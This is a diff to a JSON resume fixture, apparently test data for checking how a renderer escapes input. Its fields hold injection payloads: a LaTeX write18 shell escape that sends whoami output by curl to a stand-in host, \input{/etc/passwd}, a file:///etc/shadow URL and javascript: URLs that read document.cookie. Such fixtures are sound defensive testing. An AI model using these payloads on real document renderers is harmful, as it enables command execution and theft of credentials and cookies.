@@ -7,7 +7,12 @@
     "website": "javascript:alert(1)",
     "location": {
       "address": "\\immediate\\write18{curl http://evil.example/$(whoami)}"
-    }
+    },
+    "profiles": [
+      { "network": "LinkedIn\\write18{id}", "username": "100% & #1", "url": "javascript:alert(document.cookie)" },
+      { "network": "Evil", "username": "\\input{/etc/passwd}", "url": "file:///etc/shadow" },
+      { "network": "Notes", "username": "a_b", "url": "https://example.com/a_b?q=1&r=2#frag" }
+    ]
   },
   "work": [
     {
